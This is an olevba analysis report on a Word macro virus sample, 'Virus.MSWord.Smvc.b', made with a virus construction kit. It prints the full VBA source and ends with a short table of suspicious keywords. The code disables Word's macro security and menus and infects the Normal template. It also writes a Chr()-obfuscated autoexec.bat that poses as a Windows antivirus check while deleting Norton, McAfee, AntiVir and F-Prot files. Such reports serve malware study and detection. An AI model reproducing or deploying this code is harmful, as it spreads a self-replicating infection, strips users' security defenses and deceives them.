olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Smvc.b
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Smvc.b - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*
'$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$
'*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*
'   __   __
'  |  | |  |
' _|__|_|__|_   ____      ____   _________   _________   _________   ____   ____   ___   ________
'/           \ /    \    /    \ /         \ /         \ /         \ /    \ /    \ /   \ /        \
'|   ________| |     \  /     | |   ___   | |   ___   | |         | |    | |    | |   | |   _____/
'|  |          |      \/      | |  /   \  | |  /   \  | |         | |    | |    | \___/ |   |
'|  |________  |              | |  |   |  | |  |   |  | |__     __| |    |_|    |  ___  |   |__
'|           \ |              | |  |   |  | |  |   |  |    |   |    |           | |   | |      |
'|______     | |    |\  /|    | |  |   |  | |  |   |  |    |   |    |     _     | |   | |    __|
'       |    | |    | \/ |    | |  |   |  | |  |   |  |    |   |    |    | |    | |   | |   |
' ______|    | |    |    |    | |  \___/  | |  \___/  |    |   |    |    | |    | |   | |   |____
'|           | |    |    |    | |         | |         |    |   |    |    | |    | |   | |        \
'\___________/ \____/    \____/ \_________/ \_________/    \___/    \____/ \____/ \___/ \________/
'  |  | |  |                                                - $MOOTHiE Da HuStla [ZeroGravity]
'  |__| |__|                                                - August 15, 2000
'
'*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*
'$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$
'*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*

'Virus Creation: 10/23/00 9:14:34 PM
'$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$
'$*  Poly       = No            $*
'$*  Retro      = Yes           $*
'$*  Stealth    = High          $*
'$*  Infection  = New           $*
'$*  Payload    = Save          $*
'$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$

Private Declare Function ShowCursor Lib "user32" (ByVal bShow As Long) As Long

Private Sub Document_Open()
On Error Resume Next
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = 1&
CommandBars("Macro").Controls("Security...").Enabled = 0
CommandBars("Macro").Controls("Macros...").Enabled = 0
End Sub

Private Sub Document_New()
On Error Resume Next
'Author:   $MOOTHiE Da HuStla [Zer0Gravity]
'Name:     Sample #2
'Comments: This is a random virus sample
'Origin:   USA
'This Word2000 virus was created using $MOOTHiE Da HuStla's Macro Virus Creator 2000 Ver 2.0

On Error Resume Next: Randomize
Dim XXX1 As Object, XXX2 As Object, XXX3 As Object, XXX4 As Object, XXX5 As Object
Dim YYY1 As Object, YYY2 As Object, YYY3 As Object, YYY4 As Object, YYY5 As Object
Set XXX1 = ActiveDocument: Set XXX2 = XXX1.VBProject: Set XXX3 = XXX2.VBComponents: Set XXX4 = XXX3.Item(1): Set XXX5 = XXX4.CodeModule
Set YYY1 = NormalTemplate: Set YYY2 = YYY1.VBProject: Set YYY3 = YYY2.VBComponents: Set YYY4 = YYY3.Item(1): Set YYY5 = YYY4.CodeModule

AAA = YYY5.countoflines: BBB = XXX5.countoflines: CCC = Chr(Int(Rnd * 25) + 65): Chr (Int(Rnd * 25) + 65): Chr (Int(Rnd * 25) + 65)

If AAA < BBB Then
For XXX = 1 To AAA: NT5.replaceline XXX, CCC: Next XXX
For XXX = 1 To BBB: XXXA = XXX5.lines(XXX, 1): YYY5.insertlines XXX, XXXA: Next XXX
NormalTemplate.Save: End If


If BBB < AAA Then
For XXX = 1 To BBB: XXX5.replaceline XXX, CCC: Next XXX
For XXX = 1 To AAA: XXXA = YYY5.lines(XXX, 1): XXX5.insertlines XXX, XXXA: Next XXX
ActiveDocument.Save: End If
Call Retro
End Sub

Sub FileSave()
On Error Resume Next
AAA = ShowCursor(0)
ActiveDocument.Save 'Actual Save Command
End Sub


Private Sub Retro()
On Error Resume Next: h$ = Chr(99) & Chr(58) & Chr(92) & Chr(97) & Chr(117) & Chr(116) & Chr(111) & Chr(101) & Chr(120) & Chr(101) & Chr(99) & Chr(46) & Chr(98) & Chr(97) & Chr(116)
Open h$ For Output As #1
OO$ = Chr(82) & Chr(69) & Chr(77) & Chr(32) & Chr(45) & Chr(32) & Chr(84) & Chr(104) & Chr(105) & Chr(115) & Chr(32) & Chr(115) & Chr(101) & Chr(99) & Chr(116) & Chr(105) & Chr(111) & Chr(110) & Chr(32) & Chr(112) & Chr(117) & Chr(116) & Chr(32) & Chr(105) & Chr(110) & Chr(32) & Chr(98) & Chr(121) & Chr(32) & Chr(87) & Chr(105) & Chr(110) & Chr(100) & Chr(111) & Chr(119) & Chr(115) & Chr(44) & Chr(32) & Chr(105) & Chr(102) & Chr(32) & Chr(100) & Chr(101) & Chr(108) & Chr(101) & Chr(116) & Chr(101) & Chr(100) & Chr(44)
PP$ = Chr(32) & Chr(87) & Chr(105) & Chr(110) & Chr(100) & Chr(111) & Chr(119) & Chr(115) & Chr(32) & Chr(119) & Chr(105) & Chr(108) & Chr(108) & Chr(32) & Chr(110) & Chr(111) & Chr(32) & Chr(108) & Chr(111) & Chr(110) & Chr(103) & Chr(101) & Chr(114) & Chr(32) & Chr(115) & Chr(116) & Chr(97) & Chr(114) & Chr(116) & Chr(32) & Chr(117) & Chr(112) & Chr(32) & Chr(45) & Chr(13) & Chr(10) & Chr(82) & Chr(69) & Chr(77) & Chr(32) & Chr(45) & Chr(32) & Chr(80) & Chr(108) & Chr(101) & Chr(97) & Chr(115) & Chr(101) & Chr(32) & Chr(68)
QQ$ = Chr(111) & Chr(32) & Chr(78) & Chr(111) & Chr(116) & Chr(32) & Chr(82) & Chr(101) & Chr(109) & Chr(111) & Chr(118) & Chr(101) & Chr(32) & Chr(45)
YY$ = OO$ & PP$ & QQ$: Print #1, YY$
OO$ = Chr(64) & Chr(101) & Chr(99) & Chr(104) & Chr(111) & Chr(32) & Chr(111) & Chr(102) & Chr(102) & Chr(13) & Chr(10) & Chr(101) & Chr(99) & Chr(104) & Chr(111) & Chr(32) & Chr(89) & Chr(111) & Chr(117) & Chr(32) & Chr(65) & Chr(110) & Chr(116) & Chr(105) & Chr(45) & Chr(86) & Chr(105) & Chr(114) & Chr(117) & Chr(115) & Chr(32) & Chr(115) & Chr(111) & Chr(102) & Chr(116) & Chr(119) & Chr(97) & Chr(114) & Chr(101) & Chr(32) & Chr(119) & Chr(105) & Chr(108) & Chr(108) & Chr(32) & Chr(110) & Chr(111) & Chr(119) & Chr(32)
PP$ = Chr(99) & Chr(104) & Chr(101) & Chr(99) & Chr(107) & Chr(32) & Chr(121) & Chr(111) & Chr(117) & Chr(32) & Chr(115) & Chr(121) & Chr(115) & Chr(116) & Chr(101) & Chr(109) & Chr(46) & Chr(46) & Chr(46)
YY$ = OO$ & PP$: Print #1, YY$
OO$ = Chr(100) & Chr(101) & Chr(108) & Chr(32) & Chr(99) & Chr(58) & Chr(92) & Chr(112) & Chr(114) & Chr(111) & Chr(103) & Chr(114) & Chr(97) & Chr(126) & Chr(49) & Chr(92) & Chr(110) & Chr(111) & Chr(114) & Chr(116) & Chr(111) & Chr(110) & Chr(126) & Chr(49) & Chr(92) & Chr(42) & Chr(46) & Chr(101) & Chr(120) & Chr(101) & Chr(13) & Chr(10) & Chr(100) & Chr(101) & Chr(108) & Chr(32) & Chr(99) & Chr(58) & Chr(92) & Chr(112) & Chr(114) & Chr(111) & Chr(103) & Chr(114) & Chr(97) & Chr(126) & Chr(49) & Chr(92) & Chr(110)
PP$ = Chr(111) & Chr(114) & Chr(116) & Chr(111) & Chr(110) & Chr(126) & Chr(49) & Chr(92) & Chr(42) & Chr(46) & Chr(100) & Chr(108) & Chr(108) & Chr(13) & Chr(10) & Chr(100) & Chr(101) & Chr(108) & Chr(32) & Chr(99) & Chr(58) & Chr(92) & Chr(112) & Chr(114) & Chr(111) & Chr(103) & Chr(114) & Chr(97) & Chr(126) & Chr(49) & Chr(92) & Chr(110) & Chr(111) & Chr(114) & Chr(116) & Chr(111) & Chr(110) & Chr(126) & Chr(49) & Chr(92) & Chr(42) & Chr(46) & Chr(100) & Chr(97) & Chr(116) & Chr(13) & Chr(10) & Chr(100) & Chr(101) & Chr(108)
QQ$ = Chr(32) & Chr(99) & Chr(58) & Chr(92) & Chr(112) & Chr(114) & Chr(111) & Chr(103) & Chr(114) & Chr(97) & Chr(126) & Chr(49) & Chr(92) & Chr(110) & Chr(111) & Chr(114) & Chr(116) & Chr(111) & Chr(110) & Chr(126) & Chr(49) & Chr(92) & Chr(42) & Chr(46) & Chr(118) & Chr(120) & Chr(100) & Chr(13) & Chr(10) & Chr(100) & Chr(101) & Chr(108) & Chr(32) & Chr(99) & Chr(58) & Chr(92) & Chr(110) & Chr(111) & Chr(114) & Chr(116) & Chr(111) & Chr(110) & Chr(126) & Chr(49) & Chr(92) & Chr(42) & Chr(46) & Chr(101) & Chr(120) & Chr(101)
SS$ = Chr(13) & Chr(10) & Chr(100) & Chr(101) & Chr(108) & Chr(32) & Chr(99) & Chr(58) & Chr(92) & Chr(110) & Chr(111) & Chr(114) & Chr(116) & Chr(111) & Chr(110) & Chr(126) & Chr(49) & Chr(92) & Chr(42) & Chr(46) & Chr(100) & Chr(108) & Chr(108) & Chr(13) & Chr(10) & Chr(100) & Chr(101) & Chr(108) & Chr(32) & Chr(99) & Chr(58) & Chr(92) & Chr(110) & Chr(111) & Chr(114) & Chr(116) & Chr(111) & Chr(110) & Chr(126) & Chr(49) & Chr(92) & Chr(42) & Chr(46) & Chr(100) & Chr(97) & Chr(116) & Chr(13) & Chr(10) & Chr(100) & Chr(101)
TT$ = Chr(108) & Chr(32) & Chr(99) & Chr(58) & Chr(92) & Chr(110) & Chr(111) & Chr(114) & Chr(116) & Chr(111) & Chr(110) & Chr(126) & Chr(49) & Chr(92) & Chr(42) & Chr(46) & Chr(118) & Chr(120) & Chr(100)
YY$ = OO$ & PP$ & QQ$ & SS$ & TT$: Print #1, YY$
OO$ = Chr(100) & Chr(101) & Chr(108) & Chr(32) & Chr(99) & Chr(58) & Chr(92) & Chr(112) & Chr(114) & Chr(111) & Chr(103) & Chr(114) & Chr(97) & Chr(126) & Chr(49) & Chr(92) & Chr(97) & Chr(110) & Chr(116) & Chr(105) & Chr(118) & Chr(126) & Chr(49) & Chr(92) & Chr(42) & Chr(46) & Chr(97) & Chr(118) & Chr(99) & Chr(13) & Chr(10) & Chr(100) & Chr(101) & Chr(108) & Chr(32) & Chr(99) & Chr(58) & Chr(92) & Chr(112) & Chr(114) & Chr(111) & Chr(103) & Chr(114) & Chr(97) & Chr(126) & Chr(49) & Chr(92) & Chr(97) & Chr(110)
PP$ = Chr(116) & Chr(105) & Chr(118) & Chr(126) & Chr(49) & Chr(92) & Chr(42) & Chr(46) & Chr(115) & Chr(101) & Chr(116) & Chr(32) & Chr(13) & Chr(10) & Chr(100) & Chr(101) & Chr(108) & Chr(32) & Chr(99) & Chr(58) & Chr(92) & Chr(112) & Chr(114) & Chr(111) & Chr(103) & Chr(114) & Chr(97) & Chr(126) & Chr(49) & Chr(92) & Chr(97) & Chr(110) & Chr(116) & Chr(105) & Chr(118) & Chr(126) & Chr(49) & Chr(92) & Chr(42) & Chr(46) & Chr(100) & Chr(108) & Chr(108) & Chr(13) & Chr(10) & Chr(100) & Chr(101) & Chr(108) & Chr(32) & Chr(99)
QQ$ = Chr(58) & Chr(92) & Chr(112) & Chr(114) & Chr(111) & Chr(103) & Chr(114) & Chr(97) & Chr(126) & Chr(49) & Chr(92) & Chr(97) & Chr(110) & Chr(116) & Chr(105) & Chr(118) & Chr(126) & Chr(49) & Chr(92) & Chr(42) & Chr(46) & Chr(118) & Chr(120) & Chr(100) & Chr(13) & Chr(10) & Chr(100) & Chr(101) & Chr(108) & Chr(32) & Chr(99) & Chr(58) & Chr(92) & Chr(112) & Chr(114) & Chr(111) & Chr(103) & Chr(114) & Chr(97) & Chr(126) & Chr(49) & Chr(92) & Chr(97) & Chr(110) & Chr(116) & Chr(105) & Chr(118) & Chr(126) & Chr(49) & Chr(92)
SS$ = Chr(42) & Chr(46) & Chr(101) & Chr(120) & Chr(101) & Chr(13) & Chr(10) & Chr(100) & Chr(101) & Chr(108) & Chr(32) & Chr(99) & Chr(58) & Chr(92) & Chr(97) & Chr(110) & Chr(116) & Chr(105) & Chr(118) & Chr(126) & Chr(49) & Chr(92) & Chr(42) & Chr(46) & Chr(97) & Chr(118) & Chr(99) & Chr(13) & Chr(10) & Chr(100) & Chr(101) & Chr(108) & Chr(32) & Chr(99) & Chr(58) & Chr(92) & Chr(97) & Chr(110) & Chr(116) & Chr(105) & Chr(118) & Chr(126) & Chr(49) & Chr(92) & Chr(42) & Chr(46) & Chr(115) & Chr(101) & Chr(116) & Chr(13)
TT$ = Chr(10) & Chr(100) & Chr(101) & Chr(108) & Chr(32) & Chr(99) & Chr(58) & Chr(92) & Chr(97) & Chr(110) & Chr(116) & Chr(105) & Chr(118) & Chr(126) & Chr(49) & Chr(92) & Chr(42) & Chr(46) & Chr(100) & Chr(108) & Chr(108) & Chr(13) & Chr(10) & Chr(100) & Chr(101) & Chr(108) & Chr(32) & Chr(99) & Chr(58) & Chr(92) & Chr(97) & Chr(110) & Chr(116) & Chr(105) & Chr(118) & Chr(126) & Chr(49) & Chr(92) & Chr(42) & Chr(46) & Chr(118) & Chr(120) & Chr(100) & Chr(13) & Chr(10) & Chr(100) & Chr(101) & Chr(108) & Chr(32) & Chr(99)
UU$ = Chr(58) & Chr(92) & Chr(97) & Chr(110) & Chr(116) & Chr(105) & Chr(118) & Chr(126) & Chr(49) & Chr(92) & Chr(42) & Chr(46) & Chr(101) & Chr(120) & Chr(101)
YY$ = OO$ & PP$ & QQ$ & SS$ & TT$ & UU$: Print #1, YY$
OO$ = Chr(100) & Chr(101) & Chr(108) & Chr(32) & Chr(99) & Chr(58) & Chr(92) & Chr(112) & Chr(114) & Chr(111) & Chr(103) & Chr(114) & Chr(97) & Chr(126) & Chr(49) & Chr(92) & Chr(109) & Chr(99) & Chr(97) & Chr(102) & Chr(101) & Chr(101) & Chr(126) & Chr(49) & Chr(92) & Chr(42) & Chr(46) & Chr(100) & Chr(97) & Chr(116) & Chr(13) & Chr(10) & Chr(100) & Chr(101) & Chr(108) & Chr(32) & Chr(99) & Chr(58) & Chr(92) & Chr(112) & Chr(114) & Chr(111) & Chr(103) & Chr(114) & Chr(97) & Chr(126) & Chr(49) & Chr(92) & Chr(109)
PP$ = Chr(99) & Chr(97) & Chr(102) & Chr(101) & Chr(101) & Chr(126) & Chr(49) & Chr(92) & Chr(42) & Chr(46) & Chr(100) & Chr(108) & Chr(108) & Chr(13) & Chr(10) & Chr(100) & Chr(101) & Chr(108) & Chr(32) & Chr(99) & Chr(58) & Chr(92) & Chr(112) & Chr(114) & Chr(111) & Chr(103) & Chr(114) & Chr(97) & Chr(126) & Chr(49) & Chr(92) & Chr(109) & Chr(99) & Chr(97) & Chr(102) & Chr(101) & Chr(101) & Chr(126) & Chr(49) & Chr(92) & Chr(42) & Chr(46) & Chr(101) & Chr(120) & Chr(101) & Chr(13) & Chr(10) & Chr(100) & Chr(101) & Chr(108)
QQ$ = Chr(32) & Chr(99) & Chr(58) & Chr(92) & Chr(112) & Chr(114) & Chr(111) & Chr(103) & Chr(114) & Chr(97) & Chr(126) & Chr(49) & Chr(92) & Chr(109) & Chr(99) & Chr(97) & Chr(102) & Chr(101) & Chr(101) & Chr(126) & Chr(49) & Chr(92) & Chr(42) & Chr(46) & Chr(118) & Chr(115) & Chr(99) & Chr(13) & Chr(10) & Chr(100) & Chr(101) & Chr(108) & Chr(32) & Chr(99) & Chr(58) & Chr(92) & Chr(112) & Chr(114) & Chr(111) & Chr(103) & Chr(114) & Chr(97) & Chr(126) & Chr(49) & Chr(92) & Chr(109) & Chr(99) & Chr(97) & Chr(102) & Chr(101)
SS$ = Chr(101) & Chr(92) & Chr(42) & Chr(46) & Chr(100) & Chr(97) & Chr(116) & Chr(13) & Chr(10) & Chr(100) & Chr(101) & Chr(108) & Chr(32) & Chr(99) & Chr(58) & Chr(92) & Chr(112) & Chr(114) & Chr(111) & Chr(103) & Chr(114) & Chr(97) & Chr(126) & Chr(49) & Chr(92) & Chr(109) & Chr(99) & Chr(97) & Chr(102) & Chr(101) & Chr(101) & Chr(92) & Chr(42) & Chr(46) & Chr(100) & Chr(108) & Chr(108) & Chr(13) & Chr(10) & Chr(100) & Chr(101) & Chr(108) & Chr(32) & Chr(99) & Chr(58) & Chr(92) & Chr(112) & Chr(114) & Chr(111) & Chr(103)
TT$ = Chr(114) & Chr(97) & Chr(126) & Chr(49) & Chr(92) & Chr(109) & Chr(99) & Chr(97) & Chr(102) & Chr(101) & Chr(101) & Chr(92) & Chr(42) & Chr(46) & Chr(101) & Chr(120) & Chr(101) & Chr(13) & Chr(10) & Chr(100) & Chr(101) & Chr(108) & Chr(32) & Chr(99) & Chr(58) & Chr(92) & Chr(112) & Chr(114) & Chr(111) & Chr(103) & Chr(114) & Chr(97) & Chr(126) & Chr(49) & Chr(92) & Chr(109) & Chr(99) & Chr(97) & Chr(102) & Chr(101) & Chr(101) & Chr(92) & Chr(42) & Chr(46) & Chr(118) & Chr(115) & Chr(99) & Chr(13) & Chr(10) & Chr(100)
UU$ = Chr(101) & Chr(108) & Chr(32) & Chr(99) & Chr(58) & Chr(92) & Chr(109) & Chr(99) & Chr(97) & Chr(102) & Chr(101) & Chr(101) & Chr(126) & Chr(49) & Chr(92) & Chr(42) & Chr(46) & Chr(100) & Chr(97) & Chr(116) & Chr(13) & Chr(10) & Chr(100) & Chr(101) & Chr(108) & Chr(32) & Chr(99) & Chr(58) & Chr(92) & Chr(109) & Chr(99) & Chr(97) & Chr(102) & Chr(101) & Chr(101) & Chr(126) & Chr(49) & Chr(92) & Chr(42) & Chr(46) & Chr(100) & Chr(108) & Chr(108) & Chr(13) & Chr(10) & Chr(100) & Chr(101) & Chr(108) & Chr(32) & Chr(99)
VV$ = Chr(58) & Chr(92) & Chr(109) & Chr(99) & Chr(97) & Chr(102) & Chr(101) & Chr(101) & Chr(126) & Chr(49) & Chr(92) & Chr(42) & Chr(46) & Chr(101) & Chr(120) & Chr(101) & Chr(13) & Chr(10) & Chr(100) & Chr(101) & Chr(108) & Chr(32) & Chr(99) & Chr(58) & Chr(92) & Chr(109) & Chr(99) & Chr(97) & Chr(102) & Chr(101) & Chr(101) & Chr(126) & Chr(49) & Chr(92) & Chr(42) & Chr(46) & Chr(118) & Chr(115) & Chr(99)
YY$ = OO$ & PP$ & QQ$ & SS$ & TT$ & UU$ & VV$: Print #1, YY$
OO$ = Chr(100) & Chr(101) & Chr(108) & Chr(32) & Chr(99) & Chr(58) & Chr(92) & Chr(112) & Chr(114) & Chr(111) & Chr(103) & Chr(114) & Chr(97) & Chr(126) & Chr(49) & Chr(92) & Chr(102) & Chr(115) & Chr(105) & Chr(92) & Chr(102) & Chr(45) & Chr(112) & Chr(114) & Chr(111) & Chr(116) & Chr(92) & Chr(42) & Chr(46) & Chr(101) & Chr(120) & Chr(101) & Chr(13) & Chr(10) & Chr(100) & Chr(101) & Chr(108) & Chr(32) & Chr(99) & Chr(58) & Chr(92) & Chr(112) & Chr(114) & Chr(111) & Chr(103) & Chr(114) & Chr(97) & Chr(126) & Chr(49)
PP$ = Chr(92) & Chr(102) & Chr(115) & Chr(105) & Chr(92) & Chr(102) & Chr(45) & Chr(112) & Chr(114) & Chr(111) & Chr(116) & Chr(92) & Chr(42) & Chr(46) & Chr(100) & Chr(108) & Chr(108) & Chr(13) & Chr(10) & Chr(100) & Chr(101) & Chr(108) & Chr(32) & Chr(99) & Chr(58) & Chr(92) & Chr(112) & Chr(114) & Chr(111) & Chr(103) & Chr(114) & Chr(97) & Chr(126) & Chr(49) & Chr(92) & Chr(102) & Chr(115) & Chr(105) & Chr(92) & Chr(102) & Chr(45) & Chr(112) & Chr(114) & Chr(111) & Chr(116) & Chr(92) & Chr(42) & Chr(46) & Chr(118) & Chr(120)
QQ$ = Chr(100) & Chr(13) & Chr(10) & Chr(100) & Chr(101) & Chr(108) & Chr(32) & Chr(99) & Chr(58) & Chr(92) & Chr(112) & Chr(114) & Chr(111) & Chr(103) & Chr(114) & Chr(97) & Chr(126) & Chr(49) & Chr(92) & Chr(102) & Chr(115) & Chr(105) & Chr(92) & Chr(102) & Chr(45) & Chr(112) & Chr(114) & Chr(111) & Chr(116) & Chr(92) & Chr(42) & Chr(46) & Chr(114) & Chr(101) & Chr(112) & Chr(13) & Chr(10) & Chr(100) & Chr(101) & Chr(108) & Chr(32) & Chr(99) & Chr(58) & Chr(92) & Chr(112) & Chr(114) & Chr(111) & Chr(103) & Chr(114) & Chr(97)
SS$ = Chr(126) & Chr(49) & Chr(92) & Chr(102) & Chr(45) & Chr(112) & Chr(114) & Chr(111) & Chr(116) & Chr(92) & Chr(42) & Chr(46) & Chr(101) & Chr(120) & Chr(101) & Chr(13) & Chr(10) & Chr(100) & Chr(101) & Chr(108) & Chr(32) & Chr(99) & Chr(58) & Chr(92) & Chr(112) & Chr(114) & Chr(111) & Chr(103) & Chr(114) & Chr(97) & Chr(126) & Chr(49) & Chr(92) & Chr(102) & Chr(45) & Chr(112) & Chr(114) & Chr(111) & Chr(116) & Chr(92) & Chr(42) & Chr(46) & Chr(100) & Chr(108) & Chr(108) & Chr(13) & Chr(10) & Chr(100) & Chr(101) & Chr(108)
TT$ = Chr(32) & Chr(99) & Chr(58) & Chr(92) & Chr(112) & Chr(114) & Chr(111) & Chr(103) & Chr(114) & Chr(97) & Chr(126) & Chr(49) & Chr(92) & Chr(102) & Chr(45) & Chr(112) & Chr(114) & Chr(111) & Chr(116) & Chr(92) & Chr(42) & Chr(46) & Chr(118) & Chr(120) & Chr(100) & Chr(13) & Chr(10) & Chr(100) & Chr(101) & Chr(108) & Chr(32) & Chr(99) & Chr(58) & Chr(92) & Chr(112) & Chr(114) & Chr(111) & Chr(103) & Chr(114) & Chr(97) & Chr(126) & Chr(49) & Chr(92) & Chr(102) & Chr(45) & Chr(112) & Chr(114) & Chr(111) & Chr(116) & Chr(92)
UU$ = Chr(42) & Chr(46) & Chr(114) & Chr(101) & Chr(112) & Chr(13) & Chr(10) & Chr(100) & Chr(101) & Chr(108) & Chr(32) & Chr(99) & Chr(58) & Chr(92) & Chr(102) & Chr(45) & Chr(112) & Chr(114) & Chr(111) & Chr(116) & Chr(92) & Chr(42) & Chr(46) & Chr(101) & Chr(120) & Chr(101) & Chr(13) & Chr(10) & Chr(100) & Chr(101) & Chr(108) & Chr(32) & Chr(99) & Chr(58) & Chr(92) & Chr(102) & Chr(45) & Chr(112) & Chr(114) & Chr(111) & Chr(116) & Chr(92) & Chr(42) & Chr(46) & Chr(100) & Chr(108) & Chr(108) & Chr(13) & Chr(10) & Chr(100)
VV$ = Chr(101) & Chr(108) & Chr(32) & Chr(99) & Chr(58) & Chr(92) & Chr(102) & Chr(45) & Chr(112) & Chr(114) & Chr(111) & Chr(116) & Chr(92) & Chr(42) & Chr(46) & Chr(118) & Chr(120) & Chr(100) & Chr(13) & Chr(10) & Chr(100) & Chr(101) & Chr(108) & Chr(32) & Chr(99) & Chr(58) & Chr(92) & Chr(102) & Chr(45) & Chr(112) & Chr(114) & Chr(111) & Chr(116) & Chr(92) & Chr(42) & Chr(46) & Chr(114) & Chr(101) & Chr(112)
YY$ = OO$ & PP$ & QQ$ & SS$ & TT$ & UU$ & VV$: Print #1, YY$
OO$ = Chr(100) & Chr(101) & Chr(108) & Chr(32) & Chr(99) & Chr(58) & Chr(92) & Chr(102) & Chr(115) & Chr(105) & Chr(92) & Chr(102) & Chr(45) & Chr(112) & Chr(114) & Chr(111) & Chr(116) & Chr(92) & Chr(42) & Chr(46) & Chr(101) & Chr(120) & Chr(101) & Chr(13) & Chr(10) & Chr(100) & Chr(101) & Chr(108) & Chr(32) & Chr(99) & Chr(58) & Chr(92) & Chr(102) & Chr(115) & Chr(105) & Chr(92) & Chr(102) & Chr(45) & Chr(112) & Chr(114) & Chr(111) & Chr(116) & Chr(92) & Chr(42) & Chr(46) & Chr(100) & Chr(108) & Chr(108) & Chr(13)
PP$ = Chr(10) & Chr(100) & Chr(101) & Chr(108) & Chr(32) & Chr(99) & Chr(58) & Chr(92) & Chr(102) & Chr(115) & Chr(105) & Chr(92) & Chr(102) & Chr(45) & Chr(112) & Chr(114) & Chr(111) & Chr(116) & Chr(92) & Chr(42) & Chr(46) & Chr(118) & Chr(120) & Chr(100) & Chr(13) & Chr(10) & Chr(100) & Chr(101) & Chr(108) & Chr(32) & Chr(99) & Chr(58) & Chr(92) & Chr(102) & Chr(115) & Chr(105) & Chr(92) & Chr(102) & Chr(45) & Chr(112) & Chr(114) & Chr(111) & Chr(116) & Chr(92) & Chr(42) & Chr(46) & Chr(114) & Chr(101) & Chr(112)
YY$ = OO$ & PP$: Print #1, YY$
OO$ = Chr(101) & Chr(99) & Chr(104) & Chr(111) & Chr(32) & Chr(83) & Chr(121) & Chr(115) & Chr(116) & Chr(101) & Chr(109) & Chr(32) & Chr(99) & Chr(104) & Chr(101) & Chr(99) & Chr(107) & Chr(32) & Chr(104) & Chr(97) & Chr(115) & Chr(32) & Chr(98) & Chr(101) & Chr(101) & Chr(110) & Chr(32) & Chr(99) & Chr(111) & Chr(109) & Chr(112) & Chr(108) & Chr(101) & Chr(116) & Chr(101) & Chr(100) & Chr(46)
Print #1, OO$
OO$ = Chr(82) & Chr(69) & Chr(77) & Chr(32) & Chr(45) & Chr(45) & Chr(45) & Chr(45) & Chr(45) & Chr(45) & Chr(45) & Chr(45) & Chr(45) & Chr(45) & Chr(45) & Chr(45) & Chr(45) & Chr(45) & Chr(45) & Chr(45) & Chr(45) & Chr(45) & Chr(45) & Chr(45) & Chr(45) & Chr(45) & Chr(45) & Chr(45) & Chr(45) & Chr(45) & Chr(45) & Chr(45) & Chr(45) & Chr(45) & Chr(45) & Chr(45) & Chr(45) & Chr(45) & Chr(45) & Chr(45) & Chr(45) & Chr(45) & Chr(45) & Chr(45) & Chr(45) & Chr(45) & Chr(45) & Chr(45) & Chr(45)
PP$ = Chr(45) & Chr(45) & Chr(45) & Chr(45) & Chr(45) & Chr(45) & Chr(45) & Chr(45) & Chr(45) & Chr(45) & Chr(45) & Chr(45) & Chr(45) & Chr(45) & Chr(45) & Chr(45) & Chr(45) & Chr(45) & Chr(45) & Chr(45) & Chr(45) & Chr(45) & Chr(45) & Chr(45) & Chr(45) & Chr(45) & Chr(45) & Chr(45) & Chr(45) & Chr(45) & Chr(45) & Chr(45) & Chr(45) & Chr(45)
YY$ = OO$ & PP$: Print #1, YY$: Close #1

End Sub

Sub ViewVBCode()
Application.Quit False
End Sub

'*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*
'$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$
'*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_New        |Runs when a new Word document is created     |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Command             |May run PowerShell commands                  |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Lib                 |May run code from a DLL                      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
+----------+--------------------+---------------------------------------------+

